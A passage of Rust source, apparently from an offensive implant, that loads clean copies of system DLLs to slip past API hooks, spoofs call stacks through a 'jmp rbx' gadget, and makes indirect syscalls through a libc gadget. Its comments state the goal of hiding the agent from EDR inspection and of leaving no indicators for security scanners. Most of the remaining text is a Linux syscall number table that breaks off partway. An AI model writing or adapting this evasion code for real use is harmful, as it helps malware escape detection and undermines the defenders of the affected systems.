fn is_forwarded_export_rva(func_rva: usize, export_dir_rva: u32, export_dir_size: u32) -> bool {
    let start = export_dir_rva as usize;
    let end = start.saturating_add(export_dir_size as usize);
    func_rva >= start && func_rva < end
}

#[cfg(windows)]
unsafe fn resolve_forwarded_export(base: usize, func_rva: usize) -> *mut std::ffi::c_void {
    let forward_str_ptr = (base + func_rva) as *const i8;
    let forward_cstr = std::ffi::CStr::from_ptr(forward_str_ptr);
    let forward_str = match forward_cstr.to_str() {
        Ok(s) => s,
        Err(_) => return std::ptr::null_mut(),
    };

    let (dll_part, func_part) = match forward_str.find('.') {
        Some(dot_pos) => (&forward_str[..dot_pos], &forward_str[dot_pos + 1..]),
        None => return std::ptr::null_mut(),
    };

    let dll_name_with_ext = if dll_part.to_ascii_lowercase().ends_with(".dll") {
        dll_part.to_string()
    } else {
        format!("{}.dll", dll_part)
    };
    let dll_lower = dll_name_with_ext.to_lowercase();

    let target_base = match map_clean_dll(&dll_lower) {
        Ok(b) => b,
        Err(_) => CLEAN_MODULES
            .get()
            .and_then(|m| m.lock().unwrap().get(&dll_lower).copied())
            .unwrap_or(0),
    };
    if target_base == 0 {
        return std::ptr::null_mut();
    }

    if let Some(stripped) = func_part.strip_prefix('#') {
        if let Ok(target_ordinal) = stripped.parse::<u32>() {
            return get_export_addr_by_ordinal(target_base, target_ordinal);
        }
        return std::ptr::null_mut();
    }

    let mut func_name_null = func_part.as_bytes().to_vec();
    func_name_null.push(0);
    let addr = get_export_addr(target_base, func_name_null.as_ptr() as *const i8);
    if addr == 0 {
        return std::ptr::null_mut();
    }

    addr as *mut std::ffi::c_void
}

/// Resolve an export by ordinal from a clean-mapped DLL.
/// This avoids calling the hookable GetProcAddress for ordinal imports (M-24).
#[cfg(windows)]
unsafe fn get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
    let (export_dir_rva, export_dir_size, ed) = match get_export_dir_any_bitness(base) {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };

    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
    if ordinal < base_ordinal {
        return std::ptr::null_mut();
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return std::ptr::null_mut();
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    if is_forwarded_export_rva(func_rva, export_dir_rva, export_dir_size) {
        return resolve_forwarded_export(base, func_rva);
    }

    (base + func_rva) as *mut std::ffi::c_void
}

/// Errors that can arise from the `clean_call!` macro.
///
/// Callers must handle each variant explicitly — in particular, `NoGadgetAvailable`
/// must never be silently ignored since it means the call will be made without
/// stack spoofing, fully exposing the agent's call stack to EDR inspection.
#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallError {
    /// No `jmp rbx` (or equivalent) gadget was found in any mapped system DLL.
    /// Proceeding with a raw un-spoofed call is a deliberate security trade-off
    /// that the caller must accept explicitly.
    NoGadgetAvailable,
}

#[cfg(windows)]
impl std::fmt::Display for SyscallError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SyscallError::NoGadgetAvailable => {
                write!(f, "no jmp-rbx gadget found; stack spoofing unavailable")
            }
        }
    }
}

#[cfg(windows)]
impl std::error::Error for SyscallError {}

#[cfg(windows)]
pub fn get_clean_api_addr(dll_name: &str, func_name: &str) -> Result<usize> {
    let base = map_clean_dll(dll_name)?;
    let c_name = std::ffi::CString::new(func_name).unwrap();
    let addr = unsafe { get_export_addr(base, c_name.as_ptr()) };
    if addr == 0 {
        return Err(anyhow!(
            "Function {} not found in clean {}",
            func_name,
            dll_name
        ));
    }
    Ok(addr)
}

#[cfg(windows)]
#[inline]
/// Safely cast a `u64` return value from `spoof_call` to the target type `D`.
/// Fails at compile time if `D` is larger than 8 bytes, preventing silent data
/// loss or undefined behaviour from an over-sized transmute.
pub unsafe fn bounded_transmute<D>(val: u64) -> D {
    const {
        assert!(
            std::mem::size_of::<D>() <= std::mem::size_of::<u64>(),
            "clean_call!: return type exceeds 8 bytes; use a different calling convention"
        )
    };
    std::mem::transmute_copy::<u64, D>(&val)
}

#[cfg(windows)]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                log::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        // Gather arguments
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // Cross-reference: primary find_jmp_rbx_gadget call site is here.
        // See find_jmp_rbx_gadget near the bottom Windows helpers section.
        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
        if gadget == 0 {
            // No stack-spoofing gadget is available.  Refuse to silently fall
            // back to a raw un-spoofed transmute-call: doing so would expose
            // the full agent call stack to EDR inspection without any warning.
            // The caller must handle this error explicitly and decide whether
            // to attempt a different gadget search, accept the risk, or abort.
            Err($crate::syscalls::SyscallError::NoGadgetAvailable)
        } else {
            // Cross-reference: primary spoof_call call site is here.
            // See spoof_call near the bottom Windows helpers section.
            let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
            // cast result back
            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
        }
    }};
}

#[cfg(target_os = "linux")]
#[macro_export]
/// Invoke a Linux syscall by name via the direct-syscall path.
///
/// Returns `anyhow::Result<u64>`:
/// * `Ok(retval)` on success (kernel return value ≥ 0).
/// * `Err(e)` when the kernel returns a negative errno, where `e` is an
///   `anyhow::Error` that includes both the syscall name and the raw errno
///   value.
///
/// # Example
/// ```rust,ignore
/// let fd = syscall!("openat", libc::AT_FDCWD, path_ptr, libc::O_RDONLY)?;
/// ```
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        let target = $crate::syscalls::get_syscall_id($func_name).expect("unknown linux syscall");
        let args: &[u64] = &[$($args as u64),*];
        unsafe {
            $crate::syscalls::do_syscall(target.ssn, args)
                .map_err(|errno| anyhow::anyhow!(
                    "syscall `{}` failed: errno {} ({})",
                    $func_name,
                    errno,
                    std::io::Error::from_raw_os_error(errno)
                ))
        }
    }};
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
    #[cfg(target_arch = "x86_64")]
    {
        // Clear the seccomp flag before invoking the syscall so we only
        // detect SIGSYS delivered by *this* call.
        SECCOMP_BLOCKED.with(|f| f.set(false));

        let mut ret: i64;
        // NOTE: options(nostack) must NOT be used here.  The `syscall` instruction
        // implicitly clobbers rcx (saved RIP) and r11 (saved RFLAGS).  Declaring
        // nostack would mislead the compiler into thinking the red-zone is intact
        // across the syscall, which is incorrect when signals can arrive and build
        // a frame on the user stack.
        match args.len() {
            0 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            1 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            2 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            3 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            4 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            5 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            6 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], in("r9") args[5], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            _ => panic!("too many syscall arguments"),
        }

        // Check whether seccomp blocked this syscall (SIGSYS delivered).
        if SECCOMP_BLOCKED.with(|f| f.replace(false)) {
            return Err(libc::EPERM);
        }

        if ret < 0 {
            Err(-ret as i32)
        } else {
            Ok(ret as u64)
        }
    }
    #[cfg(target_arch = "aarch64")]
    {
        // Clear the seccomp flag before invoking the syscall so we only
        // detect SIGSYS delivered by *this* call.
        SECCOMP_BLOCKED.with(|f| f.set(false));

        // Linux syscalls accept at most 6 register arguments on aarch64.
        if args.len() > 6 {
            // Return EINVAL instead of panicking so callers can handle this
            // invalid input path without generating a crash dump.
            return Err(libc::EINVAL);
        }

        let a0 = args.get(0).copied().unwrap_or(0);
        let a1 = args.get(1).copied().unwrap_or(0);
        let a2 = args.get(2).copied().unwrap_or(0);
        let a3 = args.get(3).copied().unwrap_or(0);
        let a4 = args.get(4).copied().unwrap_or(0);
        let a5 = args.get(5).copied().unwrap_or(0);

        // ── Indirect syscall path ───────────────────────────────────────
        // Try to resolve a `svc #0; ret` gadget from a loaded shared library
        // (libc).  When available, we branch to the gadget via `blr` so that
        // no `svc` instruction exists anywhere in the agent's own code pages.
        // This is the aarch64 analogue of the x86_64 Windows technique that
        // calls through a `syscall; ret` gadget in ntdll.
        let gadget: usize =
            *LIBC_SVC_GADGET.get_or_init(find_libc_svc_gadget);

        let mut ret: i64;
        if gadget != 0 {
            // Indirect syscall: set up registers and branch to the gadget.
            // The gadget executes `svc #0; ret`.  `blr` stores the return
            // address in x30 (LR) so the gadget's `ret` brings us back to the
            // next instruction.
            //
            // We do NOT use `options(nostack)`: the kernel may deliver a
            // signal during the SVC trap and build a signal frame on the
            // user stack.
            std::arch::asm!(
                "mov x8, {ssn}",
                "mov x0, {a0}",
                "mov x1, {a1}",
                "mov x2, {a2}",
                "mov x3, {a3}",
                "mov x4, {a4}",
                "mov x5, {a5}",
                "blr {gadget}",
                // The gadget's `ret` lands here; w0 holds the kernel return
                // value.  Use the :w modifier so both operands are 32-bit Wn
                // registers (mov Xd, Ws is not a valid aarch64 encoding).
                "mov {ret:w}, w0",
                ssn   = in(reg) ssn as u64,
                a0    = in(reg) a0,
                a1    = in(reg) a1,
                a2    = in(reg) a2,
                a3    = in(reg) a3,
                a4    = in(reg) a4,
                a5    = in(reg) a5,
                gadget = in(reg) gadget as u64,
                ret   = out(reg) ret,
                // Declare all caller-saved / scratch registers that the SVC
                // entry path or the kernel may clobber.  x0–x7 hold args and
                // the return value; x8 is the syscall number; x9–x17 are
                // IP0/IP1 and other volatile temporaries; x16/x17 may also be
                // used by the PLT veneer in the gadget's host library.  x30
                // is overwritten by `blr`.
                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
                out("x8")  _,
                out("x9")  _, out("x10") _, out("x11") _,
                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
                out("x16") _, out("x17") _,
                out("x30") _,
            );
        } else {
            // ── Direct syscall fallback ──────────────────────────────────
            // No gadget was found.  Fall back to an inline `svc #0`.  This
            // path is functionally correct but leaves a `svc` instruction in
            // the agent binary — a potential IoC for security scanners.
            //
            // svc involves a mode switch; x30 etc. may be modified by the
            // kernel entry path.  Do not use options(nostack).
            match args.len() {
                0 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        lateout("x0") ret,
                        out("x1") _, out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                1 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0,
                        lateout("x0") ret,
                        out("x1") _, out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                2 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0, in("x1") a1,
                        lateout("x0") ret,
                        out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                3 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0, in("x1") a1, in("x2") a2,
                        lateout("x0") ret,
                        out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                4 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        lateout("x0") ret,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                5 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        in("x4") a4,
                        lateout("x0") ret,
                        out("x5") _, out("x6") _, out("x7") _)
                }
                6 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        in("x4") a4, in("x5") a5,
                        lateout("x0") ret,
                        out("x6") _, out("x7") _)
                }
                // Length > 6 was already rejected above.
                _ => unreachable!(),
            }
        }
        // Check whether seccomp blocked this syscall (SIGSYS delivered).
        if SECCOMP_BLOCKED.with(|f| f.replace(false)) {
            return Err(libc::EPERM);
        }

        if ret < 0 {
            Err(-ret as i32)
        } else {
            Ok(ret as u64)
        }
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

#[cfg(all(unix, feature = "direct-syscalls"))]
fn syscall_number_raw(name: &str) -> anyhow::Result<u32> {
    #[cfg(target_arch = "x86_64")]
    match name {
        "read" => Ok(0),
        "write" => Ok(1),
        // Deprecated on Linux 5.x+ and often blocked by seccomp in containerized/sandboxed environments; prefer openat (257) with AT_FDCWD for compatibility.
        "open" => Ok(2),
        "close" => Ok(3),
        "stat" => Ok(4),
        "fstat" => Ok(5),
        "lstat" => Ok(6),
        "poll" => Ok(7),
        "lseek" => Ok(8),
        "mmap" => Ok(9),
        "mprotect" => Ok(10),
        "munmap" => Ok(11),
        "brk" => Ok(12),
        "rt_sigaction" => Ok(13),
        "rt_sigprocmask" => Ok(14),
        "rt_sigreturn" => Ok(15),
        "ioctl" => Ok(16),
        "pread64" => Ok(17),
        "pwrite64" => Ok(18),
        "readv" => Ok(19),
        "writev" => Ok(20),
        "access" => Ok(21),
        "pipe" => Ok(22),
        "select" => Ok(23),
        "sched_yield" => Ok(24),
        "mremap" => Ok(25),
        "msync" => Ok(26),
        "mincore" => Ok(27),
        "madvise" => Ok(28),
        "shmget" => Ok(29),
        "shmat" => Ok(30),
        "shmctl" => Ok(31),
        "dup" => Ok(32),
        "dup2" => Ok(33),
        "pause" => Ok(34),
        "nanosleep" => Ok(35),
        "getitimer" => Ok(36),
        "alarm" => Ok(37),
        "setitimer" => Ok(38),
        "getpid" => Ok(39),
        "sendfile" => Ok(40),
        "socket" => Ok(41),
        "connect" => Ok(42),
        "accept" => Ok(43),
        "sendto" => Ok(44),
        "recvfrom" => Ok(45),
        "sendmsg" => Ok(46),
        "recvmsg" => Ok(47),
        "shutdown" => Ok(48),
        "bind" => Ok(49),
        "listen" => Ok(50),
        "getsockname" => Ok(51),
        "getpeername" => Ok(52),
        "socketpair" => Ok(53),
        "setsockopt" => Ok(54),
        "getsockopt" => Ok(55),
        "clone" => Ok(56),
        "fork" => Ok(57),
        "vfork" => Ok(58),
        "execve" => Ok(59),
        "exit" => Ok(60),
        "wait4" => Ok(61),
        "kill" => Ok(62),
        "uname" => Ok(63),
        "semget" => Ok(64),
        "semop" => Ok(65),
        "semctl" => Ok(66),
        "shmdt" => Ok(67),
        "msgget" => Ok(68),
        "msgsnd" => Ok(69),
        "msgrcv" => Ok(70),
        "msgctl" => Ok(71),
        "fcntl" => Ok(72),
        "flock" => Ok(73),
        "fsync" => Ok(74),
        "fdatasync" => Ok(75),
        "truncate" => Ok(76),
        "ftruncate" => Ok(77),
        "getdents" => Ok(78),
        "getcwd" => Ok(79),
        "chdir" => Ok(80),
        "fchdir" => Ok(81),
        "rename" => Ok(82),
        "mkdir" => Ok(83),
        "rmdir" => Ok(84),
        "creat" => Ok(85),
        "link" => Ok(86),
        "unlink" => Ok(87),
        "symlink" => Ok(88),
        "readlink" => Ok(89),
        "chmod" => Ok(90),
        "fchmod" => Ok(91),
        "chown" => Ok(92),
        "fchown" => Ok(93),
        "lchown" => Ok(94),
        "umask" => Ok(95),
        "gettimeofday" => Ok(96),
        "getrlimit" => Ok(97),
        "getrusage" => Ok(98),
        "sysinfo" => Ok(99),
        "times" => Ok(100),
        "ptrace" => Ok(101),
        "getuid" => Ok(102),
        "syslog" => Ok(103),
        "getgid" => Ok(104),
        "setuid" => Ok(105),
        "setgid" => Ok(106),
        "geteuid" => Ok(107),
        "getegid" => Ok(108),
        "setpgid" => Ok(109),
        "getppid" => Ok(110),
        "getpgrp" => Ok(111),
        "setsid" => Ok(112),
        "setreuid" => Ok(113),
        "setregid" => Ok(114),
        "getgroups" => Ok(115),
        "setgroups" => Ok(116),
        "setresuid" => Ok(117),
        "getresuid" => Ok(118),
        "setresgid" => Ok(119),
        "getresgid" => Ok(120),
        "getpgid" => Ok(121),
        "setfsuid" => Ok(122),
        "setfsgid" => Ok(123),
        "getsid" => Ok(124),
        "capget" => Ok(125),
        "capset" => Ok(126),
        "rt_sigpending" => Ok(127),
        "rt_sigtimedwait" => Ok(128),
        "rt_sigqueueinfo" => Ok(129),
        "rt_sigsuspend" => Ok(130),
        "sigaltstack" => Ok(131),
        "utime" => Ok(132),
        "mknod" => Ok(133),
        "uselib" => Ok(134),
        "personality" => Ok(135),
        "ustat" => Ok(136),
        "statfs" => Ok(137),
        "fstatfs" => Ok(138),
        "sysfs" => Ok(139),
        "getpriority" => Ok(140),
        "setpriority" => Ok(141),
        "sched_setparam" => Ok(142),
        "sched_getparam" => Ok(143),
        "sched_setscheduler" => Ok(144),
        "sched_getscheduler" => Ok(145),
        "sched_get_priority_max" => Ok(146),
        "sched_get_priority_min" => Ok(147),
        "sched_rr_get_interval" => Ok(148),
        "mlock" => Ok(149),
        "munlock" => Ok(150),
        "mlockall" => Ok(151),
        "munlockall" => Ok(152),
        "vhangup" => Ok(153),
        "modify_ldt" => Ok(154),
        "pivot_root" => Ok(155),
        "_sysctl" => Ok(156),
        "prctl" => Ok(157),
        "arch_prctl" => Ok(158),
        "adjtimex" => Ok(159),
        "setrlimit" => Ok(160),
        "chroot" => Ok(161),
        "sync" => Ok(162),
        "acct" => Ok(163),
        "settimeofday" => Ok(164),
        "mount" => Ok(165),
        "umount2" => Ok(166),
        "swapon" => Ok(167),
        "swapoff" => Ok(168),
        "reboot" => Ok(169),
        "sethostname" => Ok(170),
        "setdomainname" => Ok(171),
        "iopl" => Ok(172),
        "ioperm" => Ok(173),
        "create_module" => Ok(174),
        "init_module" => Ok(175),
        "delete_module" => Ok(176),
        "get_kernel_syms" => Ok(177),
        "query_module" => Ok(178),
        "quotactl" => Ok(179),
        "nfsservctl" => Ok(180),
        "getpmsg" => Ok(181),
        "putpmsg" => Ok(182),
        "afs_syscall" => Ok(183),
        "tuxcall" => Ok(184),
        "security" => Ok(185),
        "gettid" => Ok(186),
        "readahead" => Ok(187),
        "setxattr" => Ok(188),
        "lsetxattr" => Ok(189),
        "fsetxattr" => Ok(190),
        "getxattr" => Ok(191),
        "lgetxattr" => Ok(192),
        "fgetxattr" => Ok(193),
        "listxattr" => Ok(194),
        "llistxattr" => Ok(195),
        "flistxattr" => Ok(196),
        "removexattr" => Ok(197),
        "lremovexattr" => Ok(198),
        "fremovexattr" => Ok(199),
        "tkill" => Ok(200),
        "time" => Ok(201),
        "futex" => Ok(202),
        "sched_setaffinity" => Ok(203),
        "sched_getaffinity" => Ok(204),
        "set_thread_area" => Ok(205),
        "io_setup" => Ok(206),
        "io_destroy" => Ok(207),
        "io_getevents" => Ok(208),
        "io_submit" => Ok(209),
        "io_cancel" => Ok(210),
        "get_thread_area" => Ok(211),
        "lookup_dcookie" => Ok(212),
        "epoll_create" => Ok(213),
        "epoll_ctl_old" => Ok(214),
        "epoll_wait_old" => Ok(215),
        "remap_file_pages" => Ok(216),
        "getdents64" => Ok(217),
        "set_tid_address" => Ok(218),
        "restart_syscall" => Ok(219),
        "semtimedop" => Ok(220),
        "fadvise64" => Ok(221),
        "timer_create" => Ok(222),
        "timer_settime" => Ok(223),
        "timer_gettime" => Ok(224),
        "timer_getoverrun" => Ok(225),
        "timer_delete" => Ok(226),
        "clock_settime" => Ok(227),
        "clock_gettime" => Ok(228),
        "clock_getres" => Ok(229),
        "clock_nanosleep" => Ok(230),
        "exit_group" => Ok(231),
        "epoll_wait" => Ok(232),
        "epoll_ctl" => Ok(233),
        "tgkill" => Ok(234),
        "utimes" => Ok(235),
        "vserver" => Ok(236),
        "mbind" => Ok(237),
        "set_mempolicy" => Ok(238),
        "get_mempolicy" => Ok(239),
        "mq_open" => Ok(240),
        "mq_unlink" => Ok(241),
        "mq_timedsend" => Ok(242),
        "mq_timedreceive" => Ok(243),
        "mq_notify" => Ok(244),
        "mq_getsetattr" => Ok(245),
        "kexec_load" => Ok(246),
        "waitid" => Ok(247),
        "add_key" => Ok(248),
        "request_key" => Ok(249),
        "keyctl" => Ok(250),
        "ioprio_set" => Ok(251),
        "ioprio_get" => Ok(252),
        "inotify_init" => Ok(253),
        "inotify_add_watch" => Ok(254),
        "inotify_rm_watch" => Ok(255),
        "migrate_pages" => Ok(256),
        "openat" => Ok(257),
        "mkdirat" => Ok(258),
        "mknodat" => Ok(259),
        "fchownat" => Ok(260),
        "futimesat" => Ok(261),
        "newfstatat" => Ok(262),
        "unlinkat" => Ok(263),
        "renameat" => Ok(264),
        "linkat" => Ok(265),
        "symlinkat" => Ok(266),
        "readlinkat" => Ok(267),
        "fchmodat" => Ok(268),
        "faccessat" => Ok(269),
        "pselect6" => Ok(270),
        "ppoll" => Ok(271),
        "unshare" => Ok(272),
        "set_robust_list" => Ok(273),
        "get_robust_list" => Ok(274),
        "splice" => Ok(275),
        "tee" => Ok(276),
        "sync_file_range" => Ok(277),
        "vmsplice" => Ok(278),
        "move_pages" => Ok(279),
        "utimensat" => Ok(280),
        "epoll_pwait" => Ok(281),
        "signalfd" => Ok(282),
        "timerfd_create" => Ok(283),
        "eventfd" => Ok(284),
        "fallocate" => Ok(285),
        "timerfd_settime" => Ok(286),
        "timerfd_gettime" => Ok(287),
        "accept4" => Ok(288),
        "signalfd4" => Ok(289),
        "eventfd2" => Ok(290),
        "epoll_create1" => Ok(291),
        "dup3" => Ok(292),
        "pipe2" => Ok(293),
        "inotify_init1" => Ok(294),
        "preadv" => Ok(295),
        "pwritev" => Ok(296),
        "rt_tgsigqueueinfo" => Ok(297),
        "perf_event_open" => Ok(298),
        "recvmmsg" => Ok(299),
        "fanotify_init" => Ok(300),
        "fanotify_mark" => Ok(301),
        "prlimit64" => Ok(302),
        "name_to_handle_at" => Ok(303),
        "open_by_handle_at" => Ok(304),
        "clock_adjtime" => Ok(305),
        "syncfs" => Ok(306),
        "sendmmsg" => Ok(307),
        "setns" => Ok(308),
        "getcpu" => Ok(309),
        "process_vm_readv" => Ok(310),
        "process_vm_writev" => Ok(311),
        "kcmp" => Ok(312),
        "finit_module" => Ok(313),
        "sched_setattr" => Ok(314),
        "sched_getattr" => Ok(315),
        "renameat2" => Ok(316),
        "seccomp" => Ok(317),
        "getrandom" => Ok(318),
        "memfd_create" => Ok(319),
        "kexec_file_load" => Ok(320),
        "bpf" => Ok(321),
        "execveat" => Ok(322),
        "userfaultfd" => Ok(323),
        "membarrier" => Ok(324),
        "mlock2" => Ok(325),
        "copy_file_range" => Ok(326),
        "preadv2" => Ok(327),
        "pwritev2" => Ok(328),
        "pkey_mprotect" => Ok(329),
        "pkey_alloc" => Ok(330),
        "pkey_free" => Ok(331),
        "statx" => Ok(332),
        "io_pgetevents" => Ok(333),
        "rseq" => Ok(334),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424),
        "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426),
        "io_uring_register" => Ok(427),
        "open_tree" => Ok(428),
        "move_mount" => Ok(429),
        "fsopen" => Ok(430),
        "fsconfig" => Ok(431),
        "fsmount" => Ok(432),
        "fspick" => Ok(433),
        "pidfd_open" => Ok(434),
        "clone3" => Ok(435),
        "close_range" => Ok(436),
        "openat2" => Ok(437),
        "pidfd_getfd" => Ok(438),
        "faccessat2" => Ok(439),
        "process_madvise" => Ok(440),
        "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442),
        "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444),
        "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446),
        "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448),
        "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450),
        "cachestat" => Ok(451),
        "fchmodat2" => Ok(452),
        "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454),
        "futex_wait" => Ok(455),
        "futex_requeue" => Ok(456),
        "statmount" => Ok(457),
        "listmount" => Ok(458),
        "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460),
        "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown x86_64 syscall: {}", name),
    }

    #[cfg(target_arch = "aarch64")]
    match name {
        "io_setup" => Ok(0),
        "io_destroy" => Ok(1),
        "io_submit" => Ok(2),
        "io_cancel" => Ok(3),
        "io_getevents" => Ok(4),
        "setxattr" => Ok(5),
        "lsetxattr" => Ok(6),
        "fsetxattr" => Ok(7),
        "getxattr" => Ok(8),
        "lgetxattr" => Ok(9),
        "fgetxattr" => Ok(10),
        "listxattr" => Ok(11),
        "llistxattr" => Ok(12),
        "flistxattr" => Ok(13),
        "removexattr" => Ok(14),
        "lremovexattr" => Ok(15),
        "fremovexattr" => Ok(16),
        "getcwd" => Ok(17),
        "lookup_dcookie" => Ok(18),
        "eventfd2" => Ok(19),
        "epoll_create1" => Ok(20),
        "epoll_ctl" => Ok(21),
        "epoll_pwait" => Ok(22),
        "dup" => Ok(23),
        "dup3" => Ok(24),
        "fcntl" => Ok(25),
        "inotify_init1" => Ok(26),
        "inotify_add_watch" => Ok(27),
        "inotify_rm_watch" => Ok(28),
        "ioctl" => Ok(29),
        "ioprio_set" => Ok(30),
        "ioprio_get" => Ok(31),
        "flock" => Ok(32),
        "mknodat" => Ok(33),
        "mkdirat" => Ok(34),
        "unlinkat" => Ok(35),
        "symlinkat" => Ok(36),
        "linkat" => Ok(37),
        "renameat" => Ok(38),
        "umount2" => Ok(39),
        "mount" => Ok(40),
        "pivot_root" => Ok(41),
        "nfsservctl" => Ok(42),
        "statfs" => Ok(43),
        "fstatfs" => Ok(44),
        "truncate" => Ok(45),
        "ftruncate" => Ok(46),
        "fallocate" => Ok(47),
        "faccessat" => Ok(48),
        "chdir" => Ok(49),
        "fchdir" => Ok(50),
        "chroot" => Ok(51),
        "fchmod" => Ok(52),
        "fchmodat" => Ok(53),
        "fchownat" => Ok(54),
        "fchown" => Ok(55),
        "openat" => Ok(56),
        "close" => Ok(57),
        "vhangup" => Ok(58),
        "pipe2" => Ok(59),
        "quotactl" => Ok(60),
        "getdents64" => Ok(61),
        "lseek" => Ok(62),
        "read" => Ok(63),
        "write" => Ok(64),
        "readv" => Ok(65),
        "writev" => Ok(66),
        "pread64" => Ok(67),
        "pwrite64" => Ok(68),
        "preadv" => Ok(69),
        "pwritev" => Ok(70),
        "sendfile" => Ok(71),
        "pselect6" => Ok(72),
        "ppoll" => Ok(73),
        "signalfd4" => Ok(74),
        "vmsplice" => Ok(75),
        "splice" => Ok(76),
        "tee" => Ok(77),
        "readlinkat" => Ok(78),
        "newfstatat" => Ok(79),
        "fstat" => Ok(80),
        "sync" => Ok(81),
        "fsync" => Ok(82),
        "fdatasync" => Ok(83),
        "sync_file_range" => Ok(84),
        "timerfd_create" => Ok(85),
        "timerfd_settime" => Ok(86),
        "timerfd_gettime" => Ok(87),
        "utimensat" => Ok(88),
        "acct" => Ok(89),
        "capget" => Ok(90),
        "capset" => Ok(91),
        "personality" => Ok(92),
        "exit" => Ok(93),
        "exit_group" => Ok(94),
        "waitid" => Ok(95),
        "set_tid_address" => Ok(96),
        "unshare" => Ok(97),
        "futex" => Ok(98),
        "set_robust_list" => Ok(99),
        "get_robust_list" => Ok(100),
        "nanosleep" => Ok(101),
        "getitimer" => Ok(102),
        "setitimer" => Ok(103),
        "kexec_load" => Ok(104),
        "init_module" => Ok(105),
        "delete_module" => Ok(106),
        "timer_create" => Ok(107),
        "timer_gettime" => Ok(108),
        "timer_getoverrun" => Ok(109),
        "timer_settime" => Ok(110),
        "timer_delete" => Ok(111),
        "clock_settime" => Ok(112),
        "clock_gettime" => Ok(113),
        "clock_getres" => Ok(114),
        "clock_nanosleep" => Ok(115),
        "syslog" => Ok(116),
        "ptrace" => Ok(117),
        "sched_setparam" => Ok(118),
        "sched_setscheduler" => Ok(119),
        "sched_getscheduler" => Ok(120),
        "sched_getparam" => Ok(121),
